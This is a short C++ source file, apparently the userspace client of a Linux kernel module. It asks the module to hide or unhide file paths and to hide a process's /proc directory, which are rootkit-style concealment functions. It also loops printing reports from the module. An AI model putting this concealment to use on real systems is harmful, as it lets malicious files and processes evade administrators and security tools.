//
// Created by idan on 1/11/24.
//

#include "file_hiding_access.h"
#include <cstring>
#include <string>
#include <iostream>

static kernel_access kernelAccess;

void hide_absolute_path(const char *path) {
    msg_to_module msg;
    memset(&msg, '\x00', sizeof(msg));

    msg.id = OPER_ADD_HIDDEN_PATH;
    strcpy(msg.data, path);

    kernelAccess.my_send_msg(msg);
}

void unhide_absolute_path(const char *path) {
    msg_to_module msg;
    memset(&msg, '\x00', sizeof(msg));

    msg.id = OPER_REMOVE_HIDDEN_PATH;
    strcpy(msg.data, path);

    kernelAccess.my_send_msg(msg);
}

void hide_process_dir(int pid) {
    std::string path = "/proc/" + std::to_string(pid);
    // todo if there is not ending forward slash to the path, it is possible that the path /proc/123 will be hidden and
    // bacuase of that the path /proc/1234 will also be considered hidden, although it is not

    hide_absolute_path(path.c_str());
}

void unhide_process_dir(int pid) {
    std::string path = "/proc/" + std::to_string(pid);

    unhide_absolute_path(path.c_str());
}

void reports_test() {
    size_t i = 0;
    while (i < 20000) {
        std::cout << i << ": ";

        struct msg_to_user response = kernelAccess.my_recv_msg();
        printf("%s\n", response.data);

        i++;
    }
}
